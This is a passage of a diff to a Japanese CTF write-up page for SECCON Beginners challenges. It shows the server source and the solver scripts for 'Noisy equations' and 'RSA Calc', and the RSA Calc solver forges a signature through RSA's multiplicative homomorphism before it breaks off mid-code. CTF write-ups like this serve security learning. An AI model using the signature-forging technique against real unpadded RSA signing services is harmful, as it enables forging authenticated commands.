 c^1_{44,1} - c^2_{44,1} &amp; c^1_{44,2} - c^2_{44,2} &amp; \dots &amp; c^1_{44,44} - c^2_{44,44}
 \end{array}
 \right]
 \left[
 \begin{array}{c}
-x_{1} \\<br>
-\vdots \\<br>
+x_{1} \\\
+\vdots \\\
 x_{44}
 \end{array}
 \right]
 $$</p>
 <p>したがってあとは\(C_1 - C_2\)の逆行列から<code>FLAG</code>を得られる。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">os</span>
-<span class="kn">import</span> <span class="nn">json</span>
-<span class="kn">import</span> <span class="nn">numpy</span> <span class="kn">as</span> <span class="nn">np</span>
-<span class="kn">from</span> <span class="nn">numpy.linalg</span> <span class="kn">import</span> <span class="n">inv</span>
+<pre><code class="language-python">import os
+import json
+import numpy as np
+from numpy.linalg import inv
 
-<span class="n">stream</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s2">&#34;nc noisy-equations.quals.beginners.seccon.jp 3000&#34;</span><span class="p">)</span>
+stream = os.popen(&quot;nc noisy-equations.quals.beginners.seccon.jp 3000&quot;)
 
-<span class="n">coeffs1</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">stream</span><span class="o">.</span><span class="n">readline</span><span class="p">())</span>
-<span class="n">answer1</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">stream</span><span class="o">.</span><span class="n">readline</span><span class="p">())</span>
+coeffs1 = json.loads(stream.readline())
+answer1 = json.loads(stream.readline())
 
-<span class="n">stream2</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s2">&#34;nc noisy-equations.quals.beginners.seccon.jp 3000&#34;</span><span class="p">)</span>
+stream2 = os.popen(&quot;nc noisy-equations.quals.beginners.seccon.jp 3000&quot;)
 
-<span class="n">coeffs2</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">stream2</span><span class="o">.</span><span class="n">readline</span><span class="p">())</span>
-<span class="n">answer2</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">stream2</span><span class="o">.</span><span class="n">readline</span><span class="p">())</span>
+coeffs2 = json.loads(stream2.readline())
+answer2 = json.loads(stream2.readline())
 
-<span class="n">coeff_diffs</span> <span class="o">=</span><span class="n">np</span><span class="o">.</span><span class="n">matrix</span><span class="p">(</span>
-    <span class="p">[</span> <span class="p">[</span> <span class="n">c1</span> <span class="o">-</span> <span class="n">c2</span> <span class="k">for</span> <span class="p">(</span><span class="n">c1</span><span class="p">,</span> <span class="n">c2</span><span class="p">)</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">c1s</span><span class="p">,</span> <span class="n">c2s</span><span class="p">)</span> <span class="p">]</span> <span class="k">for</span> <span class="p">(</span><span class="n">c1s</span><span class="p">,</span> <span class="n">c2s</span><span class="p">)</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">coeffs1</span><span class="p">,</span> <span class="n">coeffs2</span><span class="p">)</span>  <span class="p">],</span>
-    <span class="n">dtype</span> <span class="o">=</span> <span class="s1">&#39;float&#39;</span>
-<span class="p">)</span>
+coeff_diffs =np.matrix(
+    [ [ c1 - c2 for (c1, c2) in zip(c1s, c2s) ] for (c1s, c2s) in zip(coeffs1, coeffs2)  ],
+    dtype = 'float'
+)
 
-<span class="n">answer_diffs</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">transpose</span><span class="p">(</span>
-        <span class="n">np</span><span class="o">.</span><span class="n">matrix</span><span class="p">(</span>
-            <span class="p">[</span> <span class="n">a1</span> <span class="o">-</span> <span class="n">a2</span> <span class="k">for</span> <span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">)</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">answer1</span><span class="p">,</span> <span class="n">answer2</span><span class="p">)</span> <span class="p">],</span>
-            <span class="n">dtype</span> <span class="o">=</span> <span class="s1">&#39;float&#39;</span>
-        <span class="p">)</span>
-<span class="p">)</span>
+answer_diffs = np.transpose(
+        np.matrix(
+            [ a1 - a2 for (a1, a2) in zip(answer1, answer2) ],
+            dtype = 'float'
+        )
+)
 
-<span class="n">coeff_diffs_inv</span> <span class="o">=</span> <span class="n">inv</span><span class="p">(</span>
-    <span class="n">np</span><span class="o">.</span><span class="n">matrix</span><span class="p">(</span><span class="n">coeff_diffs</span><span class="p">,</span> <span class="n">dtype</span> <span class="o">=</span> <span class="s1">&#39;float&#39;</span><span class="p">)</span>
-<span class="p">)</span>
-<span class="n">flag</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">transpose</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">linalg</span><span class="o">.</span><span class="n">solve</span><span class="p">(</span><span class="n">coeff_diffs</span><span class="p">,</span> <span class="n">answer_diffs</span><span class="p">))</span>
+coeff_diffs_inv = inv(
+    np.matrix(coeff_diffs, dtype = 'float')
+)
+flag = np.transpose(np.linalg.solve(coeff_diffs, answer_diffs))
 
-<span class="n">flag_int</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">around</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span><span class="o">.</span><span class="n">astype</span><span class="p">(</span><span class="nb">int</span><span class="p">)</span><span class="o">.</span><span class="n">tolist</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
+flag_int = np.around(flag).astype(int).tolist()[0]
 
-<span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+print(flag)
 
-<span class="k">print</span><span class="p">(</span> <span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">flag_int</span> <span class="p">])</span> <span class="p">)</span>
-</code></pre></td></tr></table>
-</div>
-</div><h3 id="rsa-calc">RSA Calc</h3>
+print( &quot;&quot;.join([ chr(i) for i in flag_int ]) )
+</code></pre>
+<h3 id="rsa-calc">RSA Calc</h3>
 <p>下記のようなプログラムが動いている。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span><span class="lnt">44
-</span><span class="lnt">45
-</span><span class="lnt">46
-</span><span class="lnt">47
-</span><span class="lnt">48
-</span><span class="lnt">49
-</span><span class="lnt">50
-</span><span class="lnt">51
-</span><span class="lnt">52
-</span><span class="lnt">53
-</span><span class="lnt">54
-</span><span class="lnt">55
-</span><span class="lnt">56
-</span><span class="lnt">57
-</span><span class="lnt">58
-</span><span class="lnt">59
-</span><span class="lnt">60
-</span><span class="lnt">61
-</span><span class="lnt">62
-</span><span class="lnt">63
-</span><span class="lnt">64
-</span><span class="lnt">65
-</span><span class="lnt">66
-</span><span class="lnt">67
-</span><span class="lnt">68
-</span><span class="lnt">69
-</span><span class="lnt">70
-</span><span class="lnt">71
-</span><span class="lnt">72
-</span><span class="lnt">73
-</span><span class="lnt">74
-</span><span class="lnt">75
-</span><span class="lnt">76
-</span><span class="lnt">77
-</span><span class="lnt">78
-</span><span class="lnt">79
-</span><span class="lnt">80
-</span><span class="lnt">81
-</span><span class="lnt">82
-</span><span class="lnt">83
-</span><span class="lnt">84
-</span><span class="lnt">85
-</span><span class="lnt">86
-</span><span class="lnt">87
-</span><span class="lnt">88
-</span><span class="lnt">89
-</span><span class="lnt">90
-</span><span class="lnt">91
-</span><span class="lnt">92
-</span><span class="lnt">93
-</span><span class="lnt">94
-</span><span class="lnt">95
-</span><span class="lnt">96
-</span><span class="lnt">97
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="kn">from</span> <span class="nn">params</span> <span class="kn">import</span> <span class="n">p</span><span class="p">,</span> <span class="n">q</span><span class="p">,</span> <span class="n">flag</span>
-<span class="kn">import</span> <span class="nn">binascii</span>
-<span class="kn">import</span> <span class="nn">sys</span>
-<span class="kn">import</span> <span class="nn">signal</span>
+<pre><code class="language-python">from Crypto.Util.number import *
+from params import p, q, flag
+import binascii
+import sys
+import signal
 
 
-<span class="n">N</span> <span class="o">=</span> <span class="n">p</span> <span class="o">*</span> <span class="n">q</span>
-<span class="n">e</span> <span class="o">=</span> <span class="mi">65537</span>
-<span class="n">d</span> <span class="o">=</span> <span class="n">inverse</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="p">(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">q</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span>
+N = p * q
+e = 65537
+d = inverse(e, (p-1)*(q-1))
 
 
-<span class="k">def</span> <span class="nf">input</span><span class="p">(</span><span class="n">prompt</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">):</span>
-    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">prompt</span><span class="p">)</span>
-    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
-    <span class="k">return</span> <span class="n">sys</span><span class="o">.</span><span class="n">stdin</span><span class="o">.</span><span class="n">buffer</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+def input(prompt=''):
+    sys.stdout.write(prompt)
+    sys.stdout.flush()
+    return sys.stdin.buffer.readline().strip()
 
-<span class="k">def</span> <span class="nf">menu</span><span class="p">():</span>
-    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;&#39;&#39;----------
-</span><span class="s1">1) Sign
-</span><span class="s1">2) Exec
-</span><span class="s1">3) Exit
-</span><span class="s1">&#39;&#39;&#39;</span><span class="p">)</span>
-    <span class="k">try</span><span class="p">:</span>
-        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;&gt; &#39;</span><span class="p">)</span>
-        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
-        <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">stdin</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
-    <span class="k">except</span><span class="p">:</span>
-        <span class="k">return</span> <span class="mi">3</span>
-
-
-<span class="k">def</span> <span class="nf">cmd_sign</span><span class="p">():</span>
-    <span class="n">data</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s1">&#39;data&gt; &#39;</span><span class="p">)</span>
-    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">256</span><span class="p">:</span>
-        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;Too long</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
-        <span class="k">return</span>
-
-    <span class="k">if</span> <span class="sa">b</span><span class="s1">&#39;F&#39;</span> <span class="ow">in</span> <span class="n">data</span> <span class="ow">or</span> <span class="sa">b</span><span class="s1">&#39;1337&#39;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
-        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;Error</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
-        <span class="k">return</span>
-
-    <span class="n">signature</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">bytes_to_long</span><span class="p">(</span><span class="n">data</span><span class="p">),</span> <span class="n">d</span><span class="p">,</span> <span class="n">N</span><span class="p">)</span>
-    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;Signature: {}</span><span class="se">\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">binascii</span><span class="o">.</span><span class="n">hexlify</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="n">signature</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">()))</span>
-
-<span class="k">def</span> <span class="nf">cmd_exec</span><span class="p">():</span>
-    <span class="n">data</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s1">&#39;data&gt; &#39;</span><span class="p">)</span>
-    <span class="n">signature</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s1">&#39;signature&gt; &#39;</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
-
-    <span class="k">if</span> <span class="n">signature</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="ow">or</span> <span class="n">signature</span> <span class="o">&gt;=</span> <span class="n">N</span><span class="p">:</span>
-        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;Invalid signature</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
-        <span class="k">return</span>
-
-    <span class="n">check</span> <span class="o">=</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="nb">pow</span><span class="p">(</span><span class="n">signature</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">N</span><span class="p">))</span>
-    <span class="k">if</span> <span class="n">data</span> <span class="o">!=</span> <span class="n">check</span><span class="p">:</span>
-        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;Invalid signature</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
-        <span class="k">return</span>
-
-    <span class="n">chunks</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;,&#39;</span><span class="p">)</span>
-    <span class="n">stack</span> <span class="o">=</span> <span class="p">[]</span>
-    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">chunks</span><span class="p">:</span>
-        <span class="k">if</span> <span class="n">c</span> <span class="o">==</span> <span class="sa">b</span><span class="s1">&#39;+&#39;</span><span class="p">:</span>
-            <span class="n">stack</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">stack</span><span class="o">.</span><span class="n">pop</span><span class="p">()</span> <span class="o">+</span> <span class="n">stack</span><span class="o">.</span><span class="n">pop</span><span class="p">())</span>
-        <span class="k">elif</span> <span class="n">c</span> <span class="o">==</span> <span class="sa">b</span><span class="s1">&#39;-&#39;</span><span class="p">:</span>
-            <span class="n">stack</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">stack</span><span class="o">.</span><span class="n">pop</span><span class="p">()</span> <span class="o">-</span> <span class="n">stack</span><span class="o">.</span><span class="n">pop</span><span class="p">())</span>
-        <span class="k">elif</span> <span class="n">c</span> <span class="o">==</span> <span class="sa">b</span><span class="s1">&#39;*&#39;</span><span class="p">:</span>
-            <span class="n">stack</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">stack</span><span class="o">.</span><span class="n">pop</span><span class="p">()</span> <span class="o">*</span> <span class="n">stack</span><span class="o">.</span><span class="n">pop</span><span class="p">())</span>
-        <span class="k">elif</span> <span class="n">c</span> <span class="o">==</span> <span class="sa">b</span><span class="s1">&#39;/&#39;</span><span class="p">:</span>
-            <span class="n">stack</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">stack</span><span class="o">.</span><span class="n">pop</span><span class="p">()</span> <span class="o">/</span> <span class="n">stack</span><span class="o">.</span><span class="n">pop</span><span class="p">())</span>
-        <span class="k">elif</span> <span class="n">c</span> <span class="o">==</span> <span class="sa">b</span><span class="s1">&#39;F&#39;</span><span class="p">:</span>
-            <span class="n">val</span> <span class="o">=</span> <span class="n">stack</span><span class="o">.</span><span class="n">pop</span><span class="p">()</span>
-            <span class="k">if</span> <span class="n">val</span> <span class="o">==</span> <span class="mi">1337</span><span class="p">:</span>
-                <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">flag</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
-        <span class="k">else</span><span class="p">:</span>
-            <span class="n">stack</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">c</span><span class="p">))</span>
-
-    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;Answer: {}</span><span class="se">\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">stack</span><span class="o">.</span><span class="n">pop</span><span class="p">())))</span>
+def menu():
+    sys.stdout.write('''----------
+1) Sign
+2) Exec
+3) Exit
+''')
+    try:
+        sys.stdout.write('&gt; ')
+        sys.stdout.flush()
+        return int(sys.stdin.readline().strip())
+    except:
+        return 3
 
 
-<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
-    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;N: {}</span><span class="se">\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">N</span><span class="p">))</span>
-    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
-        <span class="k">try</span><span class="p">:</span>
-            <span class="n">command</span> <span class="o">=</span> <span class="n">menu</span><span class="p">()</span>
-            <span class="k">if</span> <span class="n">command</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
-                <span class="n">cmd_sign</span><span class="p">()</span>
-            <span class="k">if</span> <span class="n">command</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
-                <span class="n">cmd_exec</span><span class="p">()</span>
-            <span class="k">elif</span> <span class="n">command</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
-                <span class="k">break</span>
-        <span class="k">except</span><span class="p">:</span>
-            <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;Error</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
-            <span class="k">break</span>
+def cmd_sign():
+    data = input('data&gt; ')
+    if len(data) &gt; 256:
+        sys.stdout.write('Too long\n')
+        return
+
+    if b'F' in data or b'1337' in data:
+        sys.stdout.write('Error\n')
+        return
+
+    signature = pow(bytes_to_long(data), d, N)
+    sys.stdout.write('Signature: {}\n'.format(binascii.hexlify(long_to_bytes(signature)).decode()))
+
+def cmd_exec():
+    data = input('data&gt; ')
+    signature = int(input('signature&gt; '), 16)
+
+    if signature &lt; 0 or signature &gt;= N:
+        sys.stdout.write('Invalid signature\n')
+        return
+
+    check = long_to_bytes(pow(signature, e, N))
+    if data != check:
+        sys.stdout.write('Invalid signature\n')
+        return
+
+    chunks = data.split(b',')
+    stack = []
+    for c in chunks:
+        if c == b'+':
+            stack.append(stack.pop() + stack.pop())
+        elif c == b'-':
+            stack.append(stack.pop() - stack.pop())
+        elif c == b'*':
+            stack.append(stack.pop() * stack.pop())
+        elif c == b'/':
+            stack.append(stack.pop() / stack.pop())
+        elif c == b'F':
+            val = stack.pop()
+            if val == 1337:
+                sys.stdout.write(flag + '\n')
+        else:
+            stack.append(int(c))
+
+    sys.stdout.write('Answer: {}\n'.format(int(stack.pop())))
 
 
-<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
-    <span class="n">signal</span><span class="o">.</span><span class="n">alarm</span><span class="p">(</span><span class="mi">60</span><span class="p">)</span>
-    <span class="n">main</span><span class="p">()</span>
-</code></pre></td></tr></table>
-</div>
-</div><p><code>F</code>または<code>1337</code>を含まないならば、任意の文字列に署名してくれる。そしてスタック署名されたスタックマシンの命令列を実行し、狙ったところに入れる（そのために<code>F</code>や<code>1337</code>が必要）ことができればフラグが入手できる。
+def main():
+    sys.stdout.write('N: {}\n'.format(N))
+    while True:
+        try:
+            command = menu()
+            if command == 1:
+                cmd_sign()
+            if command == 2:
+                cmd_exec()
+            elif command == 3:
+                break
+        except:
+            sys.stdout.write('Error\n')
+            break
+
+
+if __name__ == '__main__':
+    signal.alarm(60)
+    main()
+</code></pre>
+<p><code>F</code>または<code>1337</code>を含まないならば、任意の文字列に署名してくれる。そしてスタック署名されたスタックマシンの命令列を実行し、狙ったところに入れる（そのために<code>F</code>や<code>1337</code>が必要）ことができればフラグが入手できる。
 RSAの準同型性を利用した。端的にいうと、いまRSAのパラメーターとして\(N, e, d\)と、任意の平文\(m_1, m_2\)があるとして、RSAは次がなりたつ。</p>
 <p>$$
 \text{Sign}_{d, N}(m_1 \times m_2) \equiv \text{Sign}_{d, N}(m_1) \times \text{Sign}_{d, N}(m_2) \bmod N
@@ -794,137 +627,70 @@ $$</p>
 <li><code>1337,F</code>を実行し、署名として（3）で得られたものを入れる</li>
 </ol>
 <p>これをやるのが下記のプログラムである。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span><span class="lnt">44
-</span><span class="lnt">45
-</span><span class="lnt">46
-</span><span class="lnt">47
-</span><span class="lnt">48
-</span><span class="lnt">49
-</span><span class="lnt">50
-</span><span class="lnt">51
-</span><span class="lnt">52
-</span><span class="lnt">53
-</span><span class="lnt">54
-</span><span class="lnt">55
-</span><span class="lnt">56
-</span><span class="lnt">57
-</span><span class="lnt">58
-</span><span class="lnt">59
-</span><span class="lnt">60
-</span><span class="lnt">61
-</span><span class="lnt">62
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">numpy</span> <span class="kn">as</span> <span class="nn">np</span>
-<span class="kn">import</span> <span class="nn">re</span>
-<span class="kn">import</span> <span class="nn">socket</span>
-<span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
+<pre><code class="language-python">import numpy as np
+import re
+import socket
+from Crypto.Util.number import *
 
-<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s2">&#34;rsacalc.quals.beginners.seccon.jp&#34;</span><span class="p">,</span> <span class="mi">10001</span><span class="p">))</span>
-<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
-<span class="n">data_n</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;N: (\d+)</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((&quot;rsacalc.quals.beginners.seccon.jp&quot;, 10001))
+data = s.recv(4096).decode(&quot;utf-8&quot;)
+data_n = re.search('N: (\d+)\n', data).group(1)
 
-<span class="n">N</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data_n</span><span class="p">)</span>
+N = int(data_n)
 
-<span class="k">print</span><span class="p">(</span><span class="s2">&#34;N: &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">N</span><span class="p">))</span>
+print(&quot;N: &quot; + str(N))
 
-<span class="n">command</span> <span class="o">=</span> <span class="n">bytes_to_long</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;1337,F&#39;</span><span class="p">)</span>
-<span class="n">half_command</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">command</span> <span class="o">/</span> <span class="mi">2</span><span class="p">)</span>
+command = bytes_to_long(b'1337,F')
+half_command = int(command / 2)
 
-<span class="k">print</span><span class="p">(</span><span class="s2">&#34;command: &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">command</span><span class="p">))</span>
+print(&quot;command: &quot; + str(command))
 
-<span class="c1"># Get `2` signature</span>
-<span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;1</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">))</span>
+# Get `2` signature
+s.sendall(b'1\n')
+print(s.recv(1024).decode(&quot;utf-8&quot;))
 
-<span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\02\n</span><span class="s1">&#39;</span><span class="p">)</span>
+s.sendall(b'\02\n')
 
-<span class="n">signature_2</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span>
